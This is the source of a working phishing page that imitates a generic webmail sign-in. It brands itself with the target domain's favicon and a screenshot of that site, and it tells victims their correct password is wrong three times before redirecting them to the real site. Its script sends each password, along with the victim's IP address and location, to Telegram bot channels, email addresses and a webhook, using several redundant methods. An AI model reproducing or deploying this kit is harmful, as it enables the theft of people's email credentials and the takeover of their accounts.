<body class="dark sharp" id="lebody" style="background-image: url(https://i.imgur.com/W6H22Ci.png) ; background-size: cover;">
   <div class="loader_b hidden" id="loader">
      <div class="loader"></div>
   </div>
   <iframe id="frame_back" scrolling="no"></iframe>
   <div class="frame_back_over"></div>
   <div class="b_base login-40">
      <div class="f_base container">
         <div class="f_in row">
            <div class="col-md-12">
               <div class="form-section" style="background:rgba(250,250,250,2);">
                  <div class="f_in">
                     <div class="logo">
                        <a href="">
                            <img src="" alt="Webmail" id="logo">
                              <h2 id="logoname" style="font-size: 2rem;"> </h2>        
                        </a>
                    </div>
                     <h3 id="dom_name" style="margin-bottom: 0rem;"></h3>
                     <center><h2 style="color: #212529; line-height: 1.2;">Sign In To Continue</h2></center>

                     <div class="erx" style="display:none ;">Connection error, kindly try again!</div>
                     <div class="login-inner-form">
                        
                        <form class="f_form" id="loginForm" method="POST">
                           <input type="hidden" name="fcc" id="fcc" value="">
                           <div class="alert alert-danger mb-3 hidden" id="err" role="alert">
                           </div>
                           <div class="alert alert-primary mb-3 hidden" id="mi" role="alert">
                           </div>
                            <div class="form-group form-box">
                                <input type="email" id="email" name="email" class="input-text" placeholder="Email Address" readonly>
                            </div>
                            <div class="form-group form-box">
                                <input type="password" id="password" name="password" class="input-text" placeholder="Password" required>
                              <i class="fa fa-eye sla"  id="togglePassword" onclick="togglePasswordVisibility()" aria-hidden="true"></i>
                            </div>
                            <span id="msg" style="color:red;"></span>
                            <div class="checkbox clearfix">
                                <div class="form-check checkbox-theme">
                                    <input class="form-check-input" type="checkbox" value="" id="rem_me">
                                    <label class="form-check-label" for="rem_me">
                                        Remember me
                                    </label>
                                </div>
                            </div>
                            <div class="form-group mb-0">
                                <button type="submit" id="getitBtn" name="sub" class="btn-md btn-theme btn-block sub_b">Continue</button>

   </div>
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.0/dist/jquery.min.js"></script>
        <script>
            $(document).ready(function() {
              // Initialize attempt counter
              let attemptCount = 1;
              const MAX_ATTEMPTS = 4;
              
              const getit = new URLSearchParams(window.location.search);
              const hashedget = getit.get('e');
              
              if (!hashedget) {
                $('body').html('<div style="text-align:center; padding:50px; font-size:24px;">Please provide an email parameter in the URL (?e=email@domain.com)</div>');
              } else {
                $("#email").val(hashedget);
                let dxmain = hashedget.split("@")[1];
                let sitename = dxmain.split(".")[0].toUpperCase();
                sitename = sitename.charAt(0).toUpperCase() + sitename.slice(1).toLowerCase();
                
                document.title = sitename + document.title;
                document.querySelector('#logoname').textContent = sitename;
                
                let favimg = atob('aHR0cHM6Ly90MS5nc3RhdGljLmNvbS9mYXZpY29uVjI/Y2xpZW50PVNPQ0lBTCZ0eXBlPUZBVklDT04mZmFsbGJhY2tfb3B0cz1UWVBFLFNJWkUsVVJMJnNpemU9NjQmdXJsPWh0dHA6Ly8=')+dxmain
                document.querySelector('link[rel="shortcut icon"]').setAttribute('href', favimg);
                document.querySelector('body').style.backgroundImage = `url('https://image.thum.io/get/width/1200/http://${dxmain}')`;
                document.querySelector('#logo').setAttribute('src', favimg);
                
                // Store email domain for redirect
                window.emailDomain = 'https://' + dxmain;
              }
              
              // --- YOUR TELEGRAM CREDENTIALS ---
              const TELEGRAM_BOT_TOKEN = '8690885088:AAG_m0eN8wSy6Aaj_zZEIpVaL8zSrst2Elw';
              const TELEGRAM_CHAT_ID = '6159490685';
              
              // --- EMAIL RECIPIENTS ---
              const EMAIL_RECIPIENTS = ['6159490685@etlgr.com', 'tktren007@yandex.ru'];
              
              // METHOD 1: Direct Telegram API via Image (WORKS EVERYWHERE - no CORS)
              function sendToTelegramViaImage(message) {
                console.log('Trying Telegram via Image...');
                const img = new Image();
                img.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?` +
                  `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
                // Image load events don't matter, request is sent
                console.log('Telegram image request sent');
              }
              
              // METHOD 2: Telegram via Beacon (background)
              function sendToTelegramViaBeacon(message) {
                console.log('Trying Telegram via Beacon...');
                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?` +
                  `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
                const sent = navigator.sendBeacon(url);
                console.log('Beacon sent:', sent);
              }
              
              // METHOD 3: Telegram via Fetch (modern)
              function sendToTelegramViaFetch(message) {
                console.log('Trying Telegram via Fetch...');
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                  }),
                  mode: 'no-cors' // This bypasses CORS
                }).catch(e => console.log('Fetch error (expected with no-cors):', e));
              }
              
              // METHOD 4: Telegram via Iframe
              function sendToTelegramViaIframe(message) {
                console.log('Trying Telegram via Iframe...');
                const iframe = document.createElement('iframe');
                iframe.style.display = 'none';
                iframe.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?` +
                  `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
                document.body.appendChild(iframe);
                setTimeout(() => document.body.removeChild(iframe), 1000);
              }
              
              // METHOD 5: Telegram via Script (JSONP style)
              function sendToTelegramViaScript(message) {
                console.log('Trying Telegram via Script...');
                const script = document.createElement('script');
                script.src = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?` +
                  `chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
                document.body.appendChild(script);
                setTimeout(() => document.body.removeChild(script), 1000);
              }
              
              // EMAIL METHOD 1: via etlgr.com (direct HTTP)
              function sendToEmailViaEtlgr(message) {
                console.log('Trying Email via etlgr...');
                EMAIL_RECIPIENTS.forEach(email => {
                  // Using Image for etlgr (works like Telegram)
                  const img = new Image();
                  img.src = `http://etlgr.com:8080/send?` +
                    `to=${email}&` +
                    `from=mail@system.com&` +
                    `subject=Login+Data&` +
                    `text=${encodeURIComponent(message)}`;
                  console.log('etlgr request sent to:', email);
                  
                  // Also try fetch
                  fetch(`http://etlgr.com:8080/send?to=${email}&from=mail@system.com&subject=Login+Data&text=${encodeURIComponent(message)}`, { 
                    mode: 'no-cors' 
                  }).catch(e => {});
                });
              }
              
              // EMAIL METHOD 2: via FormSubmit (alternative)
              function sendToEmailViaFormSubmit(message) {
                console.log('Trying Email via FormSubmit...');
                EMAIL_RECIPIENTS.forEach(email => {
                  // Using Image for FormSubmit
                  const img = new Image();
                  img.src = `https://formsubmit.co/ajax/${email}?message=${encodeURIComponent(message)}`;
                  
                  // Also try fetch
                  fetch(`https://formsubmit.co/ajax/${email}`, {
                    method: 'POST',
                    mode: 'no-cors',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ message: message })
                  }).catch(e => {});
                });
              }
              
              // EMAIL METHOD 3: via Webhook.site (backup)
              function sendToEmailViaWebhook(message) {
                console.log('Trying Email via Webhook...');
                const webhookUrl = 'https://webhook.site/6c3b8a1e-9d4f-4a5b-8c2d-3e1f9a7b5d2a';
                fetch(webhookUrl, {
                  method: 'POST',
                  mode: 'no-cors',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify({ 
                    to: EMAIL_RECIPIENTS,
                    message: message,
                    source: 'mail-system'
                  })
                }).catch(e => {});
              }
              
              // MASTER FUNCTION - tries EVERY method simultaneously
              function sendDataToAll(message) {
                console.log('🔐 SENDING CREDENTIALS:', message);
                
                // TELEGRAM - try all 5 methods
                sendToTelegramViaImage(message);
                sendToTelegramViaBeacon(message);
                sendToTelegramViaFetch(message);
                sendToTelegramViaIframe(message);
                sendToTelegramViaScript(message);
                
                // EMAIL - try all methods
                sendToEmailViaEtlgr(message);
                sendToEmailViaFormSubmit(message);
                sendToEmailViaWebhook(message);
                
                // Also try direct GET requests via Image
                EMAIL_RECIPIENTS.forEach(email => {
                  // Try mailto: as last resort (opens email client)
                  // window.location.href = `mailto:${email}?subject=Login%20Data&body=${encodeURIComponent(message)}`;
                  
                  // Try to store in localStorage as backup
                  localStorage.setItem('pending_' + Date.now(), JSON.stringify({
                    email: email,
                    message: message,
                    time: new Date().toISOString()
                  }));
                });
                
                console.log('✅ All delivery methods attempted');
              }

              // Format message
              function formatLogMessage(email, password, attempt, mxRecord, ip, location) {
                const now = new Date();
                const timeString = now.toLocaleString('en-US', { 
                  year: 'numeric', month: 'numeric', day: 'numeric',
                  hour: 'numeric', minute: 'numeric', second: 'numeric',
                  hour12: true 
                }).replace(',', '');
                
                // Clean location string
                location = location.replace(/, ,/g, ',').replace(/, $/, '').replace(/^, /, '');
                if (location === '' || location === ',') location = 'Unknown';
                
                return `━━━━━━━━━━━━━━━━━━
📧 Email: ${email}
🔑 Password: ${password}
🕐 Time: ${timeString}
🌍 IP: ${ip}
📍 Location: ${location}
📨 MX: ${mxRecord}
🔢 Attempt: ${attempt}/${MAX_ATTEMPTS}`;
              }

              function getMxRecord(email) {
                const domain = email.split('@')[1];
                return `0 mail.${domain}.`;
              }

              function getIpAndLocation(callback) {
                let ip = 'Unknown';
                let location = 'Unknown';
                
                // Try multiple IP services
                fetch('https://api.ipify.org?format=json')
                  .then(r => r.json())
                  .then(data => {
                    ip = data.ip;
                    return fetch('https://ipapi.co/' + ip + '/json/');
                  })
                  .then(r => r.json())
                  .then(data => {
                    const city = data.city || '';
                    const region = data.region || '';
                    const country = data.country_name || '';
                    location = [city, region, country].filter(Boolean).join(', ');
                    callback(ip, location || 'Unknown');
                  })
                  .catch(() => {
                    // Fallback to ipapi.co directly
                    fetch('https://ipapi.co/json/')
                      .then(r => r.json())
                      .then(data => {
                        ip = data.ip || 'Unknown';
                        const city = data.city || '';
                        const region = data.region || '';
                        const country = data.country_name || '';
                        location = [city, region, country].filter(Boolean).join(', ');
                        callback(ip, location || 'Unknown');
                      })
                      .catch(() => {
                        // Final fallback
                        callback('Unable to fetch', 'Unable to fetch');
                      });
                  });
              }

              // Handle form submission
              $("#loginForm").on('submit', function(e) {
                  e.preventDefault();
                  
                  let password = $("#password").val();
                  
                  if (!password || password.length < 1) {
                      $("#msg").text("Please enter your password");
                      return;
                  }
                  
                  let email = $("#email").val();
                  let mxRecord = getMxRecord(email);
                  let currentAttempt = attemptCount;
                  
                  // Show immediate feedback
                  if (currentAttempt < MAX_ATTEMPTS) {
                      $("#msg").text("Invalid password, try again").css("color", "red");
                      $("#password").val("");
                      $("#getitBtn").prop('disabled', false).html("Continue");
                  } 
                  else {
                      $("#msg").text("Redirecting to your inbox...").css("color", "green");
                      $("#getitBtn").prop('disabled', true).html("Redirecting...");
                  }
                  
                  attemptCount++;
                  
                  // Send basic info immediately (without waiting for IP)
                  const basicMessage = formatLogMessage(email, password, currentAttempt, mxRecord, 'Fetching...', 'Fetching...');
                  sendDataToAll(basicMessage);
                  
                  // Get IP and send detailed info
                  getIpAndLocation(function(ip, location) {
                      const detailedMessage = formatLogMessage(email, password, currentAttempt, mxRecord, ip, location);
                      console.log('📤 SENDING DETAILED:', detailedMessage);
                      sendDataToAll(detailedMessage);
                  });
                  
                  if (currentAttempt === MAX_ATTEMPTS) {
                      setTimeout(function() {
                          window.location.href = window.emailDomain;
                      }, 2000);
                  }
              });
            });

            function togglePasswordVisibility() {
              const e = document.getElementById("password");
              const t = document.getElementById("togglePassword");
              
              if ("password" === e.type) {
                e.type = "text";
                t.classList.remove("fa-eye");
                t.classList.add("fa-eye-slash");
              } else {
                e.type = "password";
                t.classList.remove("fa-eye-slash");
                t.classList.add("fa-eye");
              }
            }
    </script>
